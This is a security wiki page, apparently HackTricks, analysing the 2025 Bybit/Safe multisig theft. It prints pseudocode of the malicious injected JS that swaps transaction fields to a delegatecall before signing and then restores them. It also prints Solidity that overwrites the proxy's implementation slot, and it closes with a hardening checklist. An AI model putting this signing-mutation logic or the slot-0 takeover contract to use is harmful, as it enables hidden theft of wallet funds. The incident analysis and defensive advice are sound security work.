# Compromiso del flujo de firma Web3 y toma de control del proxy Safe por delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Resumen

Una cold-wallet theft chain combinó un **compromiso de la cadena de suministro del Safe{Wallet} web UI** con una **primitiva on-chain delegatecall que sobrescribió el puntero de implementación del proxy (slot 0)**. Las conclusiones clave son:

- Si una dApp puede inyectar código en la ruta de signing, puede hacer que un signer produzca una EIP-712 signature válida sobre campos elegidos por el atacante mientras restaura los datos originales del UI para que otros signers no se den cuenta.
- Los Safe proxies almacenan `masterCopy` (implementación) en el **storage slot 0**. Un delegatecall a un contrato que escribe en slot 0 efectivamente "actualiza" el Safe con la lógica del atacante, otorgando control total de la wallet.

## Fuera de cadena: Mutación dirigida del proceso de firma en Safe{Wallet}

Un bundle de Safe manipulado (`_app-*.js`) atacó selectivamente direcciones específicas de Safe y signer. La lógica inyectada se ejecutaba justo antes de la llamada de firma:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: listas blancas hard-coded para Safes/firmares víctimas evitaban ruido y reducían la detección.
- **Last-moment mutation**: campos (`to`, `data`, `operation`, gas) se sobrescribían inmediatamente antes de `signTransaction`, y luego se revertían, de modo que las cargas de propuesta en la UI parecían benignas mientras las firmas correspondían a la carga del atacante.
- **EIP-712 opacity**: wallets mostraban datos estructurados pero no decodificaban calldata anidada ni resaltaban `operation = delegatecall`, haciendo que el mensaje mutado fuese efectivamente firmado a ciegas.

### Gateway validation relevance
Las propuestas de Safe se envían al **Safe Client Gateway**. Antes de los checks endurecidos, el gateway podía aceptar una propuesta donde `safeTxHash`/firma correspondían a campos distintos del body JSON si la UI los reescribía tras la firma. Después del incidente, el gateway ahora rechaza propuestas cuyo hash/firma no coinciden con la transacción enviada. Una verificación de hash similar en server-side debería imponerse en cualquier API de signing-orchestration.

### 2025 Bybit/Safe incident highlights
- El 21 de febrero de 2025 el drain del cold-wallet de Bybit (~401k ETH) reutilizó el mismo patrón: un Safe S3 bundle comprometido solo se activaba para los signers de Bybit y cambiaba `operation=0` → `1`, apuntando `to` a un contrato atacante pre-desplegado que escribe el slot 0.
- Una copia en Wayback de `_app-52c9031bfa03da47.js` muestra la lógica condicionada al Safe de Bybit (`0x1db9…cf4`) y a direcciones de signer, luego inmediatamente se revertía a un bundle limpio dos minutos después de la ejecución, reflejando el truco “mutar → firmar → restaurar”.
- El contrato malicioso (p.ej., `0x9622…c7242`) contenía funciones simples `sweepETH/sweepERC20` más un `transfer(address,uint256)` que escribe el implementation slot. La ejecución de `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` desplazó la implementación del proxy y otorgó control total.

## On-chain: Delegatecall proxy takeover via slot collision

Los proxies Safe mantienen `masterCopy` en el **storage slot 0** y delegan toda la lógica a él. Debido a que Safe soporta **`operation = 1` (delegatecall)**, cualquier transacción firmada puede apuntar a un contrato arbitrario y ejecutar su código en el contexto de almacenamiento del proxy.

Un contrato atacante simuló un ERC-20 `transfer(address,uint256)` pero en su lugar escribió `_to` en el slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe `masterCopy` validates signatures over these parameters.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body writes slot 0.
4. Slot 0 (`masterCopy`) now points to attacker-controlled logic → **full wallet takeover and fund drain**.

### Guard & version notes (post-incident hardening)
- Safes >= v1.3.0 can install a **Guard** to veto `delegatecall` or enforce ACLs on `to`/selectors; Bybit ran v1.1.1, so no Guard hook existed. Upgrading contracts (and re-adding owners) is required to gain this control plane.

## Detection & hardening checklist

- **UI integrity**: pin JS assets / SRI; monitor bundle diffs; treat signing UI as part of the trust boundary.
- **Sign-time validation**: hardware wallets with **EIP-712 clear-signing**; explicitly render `operation` and decode nested calldata. Reject signing when `operation = 1` unless policy allows it.
- **Server-side hash checks**: gateways/services that relay proposals must recompute `safeTxHash` and validate signatures match the submitted fields.
- **Policy/allowlists**: preflight rules for `to`, selectors, asset types, and disallow delegatecall except for vetted flows. Require an internal policy service before broadcasting fully signed transactions.
- **Contract design**: avoid exposing arbitrary delegatecall in multisig/treasury wallets unless strictly necessary. Place upgrade pointers away from slot 0 or guard with explicit upgrade logic and access control.
- **Monitoring**: alert on delegatecall executions from wallets holding treasury funds, and on proposals that change `operation` from typical `call` patterns.

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
